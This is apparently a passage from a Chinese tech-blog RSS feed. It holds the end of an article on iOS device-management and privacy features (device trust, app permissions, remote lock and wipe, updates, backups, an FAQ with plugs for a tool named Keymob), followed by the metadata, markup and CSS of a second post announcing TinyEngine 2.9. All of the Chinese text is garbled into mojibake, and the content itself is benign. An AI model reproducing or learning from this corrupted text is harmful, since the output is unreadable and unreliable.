<h3 data-id="heading-4">äºŒã€è®¾å¤‡ç®¡ç†åŠŸèƒ½è¯¦è§£</h3>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±æ¥é‡ç‚¹èŠèŠæœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿä¸­çš„è®¾å¤‡ç®¡ç†åŠŸèƒ½ã€‚è¿™ä¸€åŠŸèƒ½å¯¹äºä¿éšœè®¾å¤‡å®‰å…¨ã€ä¼˜åŒ–ä½¿ç”¨ä½“éªŒè‡³å…³é‡è¦ã€‚</p>
<h4 data-id="heading-5">1. è®¾å¤‡ä¿¡ä»»ä¸è®¤è¯</h4>
<p>åœ¨iOSç³»ç»Ÿä¸­ï¼Œè®¾å¤‡ç®¡ç†åŠŸèƒ½é¦–å…ˆä½“ç°åœ¨è®¾å¤‡ä¿¡ä»»ä¸è®¤è¯ä¸Šã€‚å½“ä½ é¦–æ¬¡è¿æ¥ä¸€å°æ–°è®¾å¤‡ï¼ˆå¦‚ç”µè„‘ï¼‰æ—¶ï¼Œç³»ç»Ÿä¼šè¦æ±‚ä½ è¿›è¡Œä¿¡ä»»è®¤è¯ã€‚è¿™ä¸€æ­¥éª¤ç¡®ä¿äº†åªæœ‰ç»è¿‡ä½ æˆæƒçš„è®¾å¤‡æ‰èƒ½è®¿é—®ä½ çš„iOSè®¾å¤‡æ•°æ®ï¼Œæœ‰æ•ˆé˜²æ­¢äº†æ•°æ®æ³„éœ²çš„é£é™©ã€‚</p>
<ul>
<li><strong>æ“ä½œæ­¥éª¤ï¼š</strong> è¿æ¥è®¾å¤‡åï¼Œå±å¹•ä¸Šä¼šå¼¹å‡ºä¿¡ä»»æç¤ºæ¡†ï¼Œç‚¹å‡»â€œä¿¡ä»»â€å³å¯å®Œæˆè®¤è¯ã€‚</li>
</ul>
<h4 data-id="heading-6">2. åº”ç”¨ä¸æ•°æ®ç®¡ç†</h4>
<p>è®¾å¤‡ç®¡ç†åŠŸèƒ½è¿˜æ¶µç›–äº†åº”ç”¨ä¸æ•°æ®çš„ç®¡ç†ã€‚é€šè¿‡è¿™ä¸€åŠŸèƒ½ï¼Œä½ å¯ä»¥è½»æ¾æŸ¥çœ‹å¹¶ç®¡ç†è®¾å¤‡ä¸Šå®‰è£…çš„æ‰€æœ‰åº”ç”¨ï¼ŒåŒ…æ‹¬åº”ç”¨çš„æ¥æºã€æƒé™è®¾ç½®ä»¥åŠæ•°æ®ä½¿ç”¨æƒ…å†µã€‚</p>
<ul>
<li><strong>åº”ç”¨æ¥æºç®¡ç†ï¼š</strong> iOSç³»ç»Ÿä¸¥æ ¼åŒºåˆ†äº†å®˜æ–¹App Storeä¸‹è½½çš„åº”ç”¨å’Œç¬¬ä¸‰æ–¹æ¥æºçš„åº”ç”¨ã€‚åœ¨è®¾å¤‡ç®¡ç†è®¾ç½®ä¸­ï¼Œä½ å¯ä»¥æ¸…æ™°çœ‹åˆ°å“ªäº›åº”ç”¨æ˜¯é€šè¿‡éå®˜æ–¹æ¸ é“å®‰è£…çš„ï¼Œå¹¶æ ¹æ®éœ€è¦è¿›è¡Œå¸è½½æˆ–ä¿¡ä»»è®¾ç½®ã€‚</li>
<li><strong>æƒé™è®¾ç½®ï¼š</strong> å¯¹äºæ¯ä¸ªåº”ç”¨ï¼Œä½ éƒ½å¯ä»¥è¯¦ç»†è®¾ç½®å…¶è®¿é—®è®¾å¤‡å„é¡¹åŠŸèƒ½çš„æƒé™ï¼Œå¦‚ç›¸æœºã€éº¦å…‹é£ã€ä½ç½®ä¿¡æ¯ç­‰ï¼Œç¡®ä¿ä¸ªäººéšç§ä¸è¢«æ»¥ç”¨ã€‚</li>
<li><strong>æ•°æ®ä½¿ç”¨ç›‘æ§ï¼š</strong> è®¾å¤‡ç®¡ç†åŠŸèƒ½è¿˜æä¾›äº†æ•°æ®ä½¿ç”¨æƒ…å†µçš„ç›‘æ§ï¼Œå¸®åŠ©ä½ äº†è§£æ¯ä¸ªåº”ç”¨çš„æ•°æ®æ¶ˆè€—æƒ…å†µï¼Œä»è€Œåˆç†è§„åˆ’æµé‡ä½¿ç”¨ã€‚</li>
</ul>
<p>å¯¹äºéœ€è¦æ›´æ·±å…¥ç®¡ç†åº”ç”¨æ•°æ®çš„ç”¨æˆ·ï¼ŒKeymobå·¥å…·æä¾›äº†æ–‡ä»¶ç®¡ç†å’Œæ€§èƒ½ç›‘æ§åŠŸèƒ½ï¼Œæ”¯æŒæŸ¥çœ‹å’Œå¯¼å‡ºAppæ•°æ®ï¼Œå¸®åŠ©ä¼˜åŒ–è®¾å¤‡ä½¿ç”¨ä½“éªŒã€‚</p>
<h4 data-id="heading-7">3. è®¾å¤‡è¿œç¨‹ç®¡ç†ä¸æŸ¥æ‰¾</h4>
<p>åœ¨æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿä¸­ï¼Œè®¾å¤‡ç®¡ç†åŠŸèƒ½è¿›ä¸€æ­¥å‡çº§ï¼Œæ”¯æŒè¿œç¨‹ç®¡ç†ä¸æŸ¥æ‰¾ã€‚è¿™æ„å‘³ç€å³ä½¿ä½ çš„è®¾å¤‡ä¸æ…ä¸¢å¤±æˆ–è¢«ç›—ï¼Œä¹Ÿèƒ½é€šè¿‡iCloudç­‰äº‘æœåŠ¡è¿›è¡Œè¿œç¨‹å®šä½ã€é”å®šæˆ–æ“¦é™¤æ•°æ®ï¼Œæœ€å¤§é™åº¦ä¿æŠ¤ä½ çš„ä¸ªäººä¿¡æ¯å®‰å…¨ã€‚</p>
<ul>
<li><strong>è¿œç¨‹å®šä½ï¼š</strong> ç™»å½•iCloudå®˜ç½‘æˆ–ä½¿ç”¨â€œæŸ¥æ‰¾æˆ‘çš„iPhoneâ€åº”ç”¨ï¼Œå³å¯å®æ—¶æŸ¥çœ‹è®¾å¤‡çš„åœ°ç†ä½ç½®ã€‚</li>
<li><strong>è¿œç¨‹é”å®šï¼š</strong> ä¸€æ—¦è®¾å¤‡ä¸¢å¤±ï¼Œä½ å¯ä»¥é€šè¿‡äº‘æœåŠ¡è¿œç¨‹é”å®šè®¾å¤‡ï¼Œé˜²æ­¢ä»–äººè®¿é—®ä½ çš„ä¸ªäººä¿¡æ¯ã€‚</li>
<li><strong>æ•°æ®æ“¦é™¤ï¼š</strong> åœ¨æç«¯æƒ…å†µä¸‹ï¼Œä½ è¿˜å¯ä»¥é€‰æ‹©è¿œç¨‹æ“¦é™¤è®¾å¤‡ä¸Šçš„æ‰€æœ‰æ•°æ®ï¼Œç¡®ä¿æ•æ„Ÿä¿¡æ¯ä¸è¢«æ³„éœ²ã€‚</li>
</ul>
<h4 data-id="heading-8">4. ç³»ç»Ÿæ›´æ–°ä¸ç»´æŠ¤</h4>
<p>è®¾å¤‡ç®¡ç†åŠŸèƒ½è¿˜åŒ…æ‹¬äº†ç³»ç»Ÿæ›´æ–°ä¸ç»´æŠ¤çš„é‡è¦æ–¹é¢ã€‚é€šè¿‡è¿™ä¸€åŠŸèƒ½ï¼Œä½ å¯ä»¥åŠæ—¶äº†è§£åˆ°iOSç³»ç»Ÿçš„æœ€æ–°ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¹¶æ ¹æ®éœ€è¦è¿›è¡Œæ›´æ–°ã€‚ç³»ç»Ÿæ›´æ–°ä¸ä»…å¸¦æ¥äº†æ–°åŠŸèƒ½å’Œæ€§èƒ½æå‡ï¼Œæ›´é‡è¦çš„æ˜¯ä¿®å¤äº†å·²çŸ¥çš„å®‰å…¨æ¼æ´ï¼Œä¸ºè®¾å¤‡å®‰å…¨ä¿é©¾æŠ¤èˆªã€‚</p>
<ul>
<li><strong>æ›´æ–°æé†’ï¼š</strong> iOSç³»ç»Ÿä¼šè‡ªåŠ¨æ£€æµ‹æ–°ç‰ˆæœ¬å¹¶æé†’ç”¨æˆ·è¿›è¡Œæ›´æ–°ã€‚</li>
<li><strong>å¤‡ä»½ä¸æ¢å¤ï¼š</strong> åœ¨è¿›è¡Œç³»ç»Ÿæ›´æ–°å‰ï¼Œå»ºè®®ç”¨æˆ·å…ˆå¤‡ä»½è®¾å¤‡æ•°æ®ã€‚iOSç³»ç»Ÿæä¾›äº†ä¾¿æ·çš„å¤‡ä»½ä¸æ¢å¤åŠŸèƒ½ï¼Œç¡®ä¿ä½ çš„é‡è¦ä¿¡æ¯ä¸ä¼šä¸¢å¤±ã€‚</li>
</ul>
<h3 data-id="heading-9">ä¸‰ã€å¦‚ä½•åˆ©ç”¨è®¾å¤‡ç®¡ç†åŠŸèƒ½æå‡å®‰å…¨ä¸ä½“éªŒ</h3>
<p>äº†è§£äº†è®¾å¤‡ç®¡ç†åŠŸèƒ½çš„åŸºæœ¬å†…å®¹åï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å……åˆ†åˆ©ç”¨è¿™äº›åŠŸèƒ½æ¥æå‡è®¾å¤‡çš„å®‰å…¨æ€§ä¸ä½¿ç”¨ä½“éªŒã€‚</p>
<h4 data-id="heading-10">1. å®šæœŸæ›´æ–°ç³»ç»Ÿ</h4>
<p>ç³»ç»Ÿæ›´æ–°æ˜¯ä¿æŒè®¾å¤‡å®‰å…¨çš„å…³é”®ã€‚å»ºè®®ç”¨æˆ·å®šæœŸå…³æ³¨iOSç³»ç»Ÿçš„æ›´æ–°æç¤ºï¼Œå¹¶åŠæ—¶è¿›è¡Œæ›´æ–°ã€‚æ–°ç‰ˆæœ¬ä¸ä»…å¸¦æ¥äº†æ€§èƒ½ä¼˜åŒ–å’Œæ–°åŠŸèƒ½ï¼Œæ›´é‡è¦çš„æ˜¯ä¿®å¤äº†å·²çŸ¥çš„å®‰å…¨æ¼æ´ï¼Œé™ä½äº†è®¾å¤‡è¢«æ”»å‡»çš„é£é™©ã€‚</p>
<h4 data-id="heading-11">2. è°¨æ…ç®¡ç†åº”ç”¨æƒé™</h4>
<p>åœ¨å®‰è£…æ–°åº”ç”¨æ—¶ï¼ŒåŠ¡å¿…ä»”ç»†é˜…è¯»å…¶æƒé™è¯·æ±‚ã€‚å¯¹äºä¸å¿…è¦çš„æƒé™ï¼Œå¦‚ç›¸æœºã€éº¦å…‹é£ç­‰ï¼Œå¯ä»¥é€‰æ‹©æ‹’ç»ã€‚é€šè¿‡è°¨æ…ç®¡ç†åº”ç”¨æƒé™ï¼Œä½ å¯ä»¥æœ‰æ•ˆé˜²æ­¢ä¸ªäººéšç§è¢«æ»¥ç”¨ã€‚</p>
<h4 data-id="heading-12">3. åˆ©ç”¨è¿œç¨‹ç®¡ç†åŠŸèƒ½ä¿æŠ¤è®¾å¤‡</h4>
<p>å¼€å¯iCloudçš„â€œæŸ¥æ‰¾æˆ‘çš„iPhoneâ€åŠŸèƒ½ï¼Œå¯ä»¥è®©ä½ åœ¨è®¾å¤‡ä¸¢å¤±æ—¶è¿…é€Ÿå®šä½å¹¶è¿œç¨‹é”å®šæˆ–æ“¦é™¤æ•°æ®ã€‚è¿™ä¸€åŠŸèƒ½å¯¹äºä¿æŠ¤ä¸ªäººéšç§å’Œè®¾å¤‡å®‰å…¨è‡³å…³é‡è¦ã€‚</p>
<h4 data-id="heading-13">4. å®šæœŸå¤‡ä»½æ•°æ®</h4>
<p>æ— è®ºæ˜¯è¿›è¡Œç³»ç»Ÿæ›´æ–°è¿˜æ˜¯æ—¥å¸¸ä½¿ç”¨ä¸­ï¼Œå®šæœŸå¤‡ä»½è®¾å¤‡æ•°æ®éƒ½æ˜¯å¿…ä¸å¯å°‘çš„ã€‚iOSç³»ç»Ÿæä¾›äº†ä¾¿æ·çš„iCloudå¤‡ä»½å’ŒiTuneså¤‡ä»½æ–¹å¼ï¼Œç¡®ä¿ä½ çš„é‡è¦ä¿¡æ¯ä¸ä¼šå› æ„å¤–è€Œä¸¢å¤±ã€‚</p>
<h3 data-id="heading-14">å››ã€ä½“éªŒæœ€æ–°ç‰ˆæœ¬iOSï¼Œä»è®¾å¤‡ç®¡ç†å¼€å§‹</h3>
<p>éšç€iOSç³»ç»Ÿçš„ä¸æ–­æ›´æ–°è¿­ä»£ï¼Œè®¾å¤‡ç®¡ç†åŠŸèƒ½ä¹Ÿåœ¨ä¸æ–­å®Œå–„å’Œå‡çº§ã€‚ä½œä¸ºè‹¹æœè®¾å¤‡çš„ç”¨æˆ·ï¼ŒæŒæ¡å¹¶å……åˆ†åˆ©ç”¨è¿™äº›åŠŸèƒ½å°†å¤§å¤§æå‡ä½ çš„ä½¿ç”¨ä½“éªŒå’Œè®¾å¤‡å®‰å…¨æ€§ã€‚</p>
<p>å¦‚æœä½ å¯¹æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿçš„è®¾å¤‡ç®¡ç†åŠŸèƒ½æ„Ÿå…´è¶£ï¼Œä¸å¦¨äº²è‡ªä½“éªŒä¸€ç•ªã€‚åªéœ€å°†ä½ çš„è®¾å¤‡æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œå³å¯å¼€å§‹æ¢ç´¢è¿™äº›å¼ºå¤§çš„åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-15">ç”¨æˆ·å…³æ³¨é—®é¢˜</h3>
<h4 data-id="heading-16">å¦‚ä½•ç®¡ç†æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿä¸Šçš„è®¾å¤‡ï¼Ÿ</h4>
<p>å°±æ˜¯è¯´ï¼Œæˆ‘æ‰‹æœºå‡çº§åˆ°äº†æœ€æ–°çš„iOSç³»ç»Ÿï¼Œç°åœ¨æƒ³çŸ¥é“æ€ä¹ˆæ›´å¥½åœ°ç®¡ç†è¿™ä¸ªç³»ç»Ÿä¸Šçš„å„ç§è®¾å¤‡è¿æ¥å’ŒåŠŸèƒ½è®¾ç½®ã€‚</p>
<p>åœ¨æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿä¸Šç®¡ç†è®¾å¤‡å˜å¾—æ›´ä¸ºä¾¿æ·å’Œæ™ºèƒ½ã€‚é¦–å…ˆï¼Œä½ å¯ä»¥é€šè¿‡ <strong>â€˜è®¾ç½®â€™åº”ç”¨</strong> è¿›å…¥è®¾å¤‡ç®¡ç†ç•Œé¢ï¼Œè¿™é‡Œå¯ä»¥æŸ¥çœ‹å·²è¿æ¥çš„è®¾å¤‡ï¼Œå¦‚è“ç‰™è€³æœºã€æ™ºèƒ½æ‰‹è¡¨ç­‰ï¼Œå¹¶å¯¹å®ƒä»¬è¿›è¡Œé…ç½®ã€‚iOSç³»ç»Ÿæ–°å¢äº†ä¸€äº›è‡ªåŠ¨åŒ–ç®¡ç†åŠŸèƒ½ï¼Œæ¯”å¦‚æ ¹æ®è®¾å¤‡ä½¿ç”¨ä¹ æƒ¯è‡ªåŠ¨è°ƒæ•´éŸ³é‡ã€å±å¹•äº®åº¦ç­‰ã€‚ <strong>åˆ©ç”¨â€˜å±å¹•ä½¿ç”¨æ—¶é—´â€™åŠŸèƒ½</strong>ï¼Œä½ è¿˜å¯ä»¥ç›‘æ§å’Œç®¡ç†å­©å­åœ¨iOSè®¾å¤‡ä¸Šçš„æ´»åŠ¨æ—¶é—´ã€‚æ­¤å¤–ï¼Œåˆ«å¿˜äº†å®šæœŸæ›´æ–°è®¾å¤‡é©±åŠ¨å’Œç³»ç»Ÿè¡¥ä¸ï¼Œä»¥ç¡®ä¿è®¾å¤‡é—´çš„å…¼å®¹æ€§å’Œå®‰å…¨æ€§ã€‚</p>
<h4 data-id="heading-17">æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿè®¾å¤‡ç®¡ç†æœ‰å“ªäº›æ–°åŠŸèƒ½ï¼Ÿ</h4>
<p>æˆ‘å¬è¯´iOSç³»ç»Ÿæ¯æ¬¡æ›´æ–°éƒ½ä¼šå¸¦æ¥ä¸€äº›è®¾å¤‡ç®¡ç†ä¸Šçš„æ–°å˜åŒ–ï¼Œé‚£æœ€æ–°ç‰ˆæœ¬éƒ½å¢åŠ äº†å“ªäº›å®ç”¨çš„åŠŸèƒ½å‘¢ï¼Ÿ</p>
<p>æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿåœ¨è®¾å¤‡ç®¡ç†æ–¹é¢ç¡®å®å¼•å…¥äº†ä¸å°‘æ–°åŠŸèƒ½ã€‚æ¯”å¦‚ï¼Œ <strong>å¢å¼ºçš„è®¾å¤‡å…¼å®¹æ€§</strong>ï¼Œè®©æ›´å¤šç±»å‹çš„å¤–éƒ¨è®¾å¤‡èƒ½å¤Ÿæ— ç¼è¿æ¥ï¼› <strong>ä¼˜åŒ–çš„è“ç‰™è¿æ¥ç¨³å®šæ€§</strong>ï¼Œå‡å°‘äº†è®¾å¤‡æ–­è¿çš„æƒ…å†µï¼›è¿˜æœ‰ <strong>æ›´æ™ºèƒ½çš„è®¾å¤‡åˆ†ç»„ç®¡ç†</strong>ï¼Œä½ å¯ä»¥æ ¹æ®è®¾å¤‡ç±»å‹æˆ–ç”¨é€”å°†å®ƒä»¬åˆ†ç»„ï¼Œä¾¿äºå¿«é€Ÿç®¡ç†å’Œæ§åˆ¶ã€‚æ­¤å¤–ï¼ŒiOSè¿˜åŠ å¼ºäº†è®¾å¤‡é—´çš„ååŒå·¥ä½œèƒ½åŠ›ï¼Œæ¯”å¦‚AirDropçš„ä¼ è¾“é€Ÿåº¦å’ŒèŒƒå›´éƒ½æœ‰æ‰€æå‡ã€‚</p>
<p>Keymobå·¥å…·è¿›ä¸€æ­¥æ‰©å±•äº†è¿™äº›åŠŸèƒ½ï¼Œæä¾›æ€§èƒ½ç›‘æ§å’Œæ—¥å¿—åˆ†æï¼Œå¸®åŠ©å¼€å‘è€…ä¼˜åŒ–åº”ç”¨åœ¨æœ€æ–°iOSç³»ç»Ÿä¸Šçš„è¿è¡Œã€‚</p>
<h4 data-id="heading-18">å¦‚ä½•åœ¨æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿä¸Šè§£å†³è®¾å¤‡ç®¡ç†é—®é¢˜ï¼Ÿ</h4>
<p>æˆ‘æœ€è¿‘åœ¨ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿæ—¶é‡åˆ°äº†ä¸€äº›è®¾å¤‡ç®¡ç†ä¸Šçš„éº»çƒ¦ï¼Œæ¯”å¦‚è®¾å¤‡è¿æ¥ä¸ä¸Šæˆ–è€…è®¾ç½®ä¸æ­£ç¡®ï¼Œè¯¥æ€ä¹ˆè§£å†³å‘¢ï¼Ÿ</p>
<p>é‡åˆ°è®¾å¤‡ç®¡ç†é—®é¢˜æ—¶ï¼Œé¦–å…ˆå¯ä»¥å°è¯• <strong>é‡å¯è®¾å¤‡å’Œé‡æ–°é…å¯¹</strong>ï¼Œè¿™æ˜¯è§£å†³è¿æ¥é—®é¢˜çš„å¸¸ç”¨æ–¹æ³•ã€‚å¦‚æœé—®é¢˜ä¾æ—§å­˜åœ¨ï¼Œå¯ä»¥è¿›å…¥ <strong>â€˜è®¾ç½®â€™-&gt;â€˜é€šç”¨â€™-&gt;â€˜é‡ç½®â€™</strong>ï¼Œé€‰æ‹©é‡ç½®ç½‘ç»œè®¾ç½®æˆ–æ‰€æœ‰è®¾ç½®ï¼ˆæ³¨æ„å¤‡ä»½æ•°æ®ï¼‰ã€‚æ­¤å¤–ï¼Œæ£€æŸ¥iOSç³»ç»Ÿçš„ç‰ˆæœ¬æ˜¯å¦ä¸ºæœ€æ–°ï¼Œå› ä¸ºè‹¹æœç»å¸¸ä¼šé€šè¿‡ç³»ç»Ÿæ›´æ–°ä¿®å¤è®¾å¤‡ç®¡ç†ç›¸å…³çš„bugã€‚å¦‚æœä¸Šè¿°æ–¹æ³•éƒ½ä¸å¥æ•ˆï¼Œå»ºè®®è”ç³»è‹¹æœå®˜æ–¹å®¢æœæˆ–å‰å¾€æˆæƒç»´ä¿®ç‚¹å¯»æ±‚ä¸“ä¸šå¸®åŠ©ã€‚</p>
<h4 data-id="heading-19">æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿè®¾å¤‡ç®¡ç†å¯¹å®‰å…¨æ€§å’Œéšç§ä¿æŠ¤æœ‰ä½•æå‡ï¼Ÿ</h4>
<p>éšç€ç½‘ç»œå®‰å…¨é—®é¢˜æ—¥ç›Šä¸¥é‡ï¼Œæˆ‘æƒ³çŸ¥é“æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿåœ¨è®¾å¤‡ç®¡ç†æ–¹é¢å¯¹å®‰å…¨æ€§å’Œéšç§ä¿æŠ¤åšäº†å“ªäº›æ”¹è¿›ï¼Ÿ</p>
<p>æœ€æ–°ç‰ˆæœ¬iOSç³»ç»Ÿåœ¨è®¾å¤‡ç®¡ç†æ–¹é¢å¯¹å®‰å…¨æ€§å’Œéšç§ä¿æŠ¤è¿›è¡Œäº†å…¨é¢å‡çº§ã€‚é¦–å…ˆï¼Œ <strong>å¢å¼ºäº†è®¾å¤‡é—´çš„åŠ å¯†é€šä¿¡</strong>ï¼Œç¡®ä¿æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®‰å…¨æ€§ï¼›å…¶æ¬¡ï¼Œå¼•å…¥äº† <strong>æ›´ä¸¥æ ¼çš„æƒé™ç®¡ç†æœºåˆ¶</strong>ï¼Œç”¨æˆ·å¯ä»¥å¯¹æ¯ä¸ªåº”ç”¨è®¿é—®è®¾å¤‡çš„æƒé™è¿›è¡Œç»†ç²’åº¦æ§åˆ¶ã€‚æ­¤å¤–ï¼ŒiOSè¿˜åŠ å¼ºäº†è®¾å¤‡ä¸¢å¤±åçš„è¿œç¨‹é”å®šå’Œæ“¦é™¤åŠŸèƒ½ï¼Œæœ‰æ•ˆé˜²æ­¢æ•°æ®æ³„éœ²ã€‚åœ¨éšç§ä¿æŠ¤æ–¹é¢ï¼ŒiOSç³»ç»Ÿæä¾›äº†æ›´é€æ˜çš„æ•°æ®æ”¶é›†å’Œä½¿ç”¨è¯´æ˜ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿæ›´æ¸…æ¥šåœ°äº†è§£è‡ªå·±çš„æ•°æ®å»å‘ã€‚</p>
<p>Keymobå·¥å…·åœ¨éšç§ä¿æŠ¤æ–¹é¢æä¾›äº†é¢å¤–æ”¯æŒï¼Œé€šè¿‡æ—¥å¿—åˆ†æå’Œå´©æºƒä¿¡æ¯æŸ¥çœ‹ï¼Œå¸®åŠ©è¯†åˆ«æ½œåœ¨å®‰å…¨é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TinyEngine2.9ç‰ˆæœ¬å‘å¸ƒï¼šæ›´æ™ºèƒ½ï¼Œæ›´çµæ´»ï¼Œæ›´å¼€æ”¾ï¼]]></title>    <link>https://juejin.cn/post/7583707681003454510</link>    <guid>https://juejin.cn/post/7583707681003454510</guid>    <pubDate>2025-12-15T09:25:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583707681003454510" data-draft-id="7583707681002602542" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TinyEngine2.9ç‰ˆæœ¬å‘å¸ƒï¼šæ›´æ™ºèƒ½ï¼Œæ›´çµæ´»ï¼Œæ›´å¼€æ”¾ï¼"/> <meta itemprop="keywords" content="ä½ä»£ç ,å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2025-12-15T09:25:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OpenTinyç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/3808325101432983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TinyEngine2.9ç‰ˆæœ¬å‘å¸ƒï¼šæ›´æ™ºèƒ½ï¼Œæ›´çµæ´»ï¼Œæ›´å¼€æ”¾ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808325101432983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OpenTinyç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:25:40.000Z" title="Mon Dec 15 2025 09:25:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 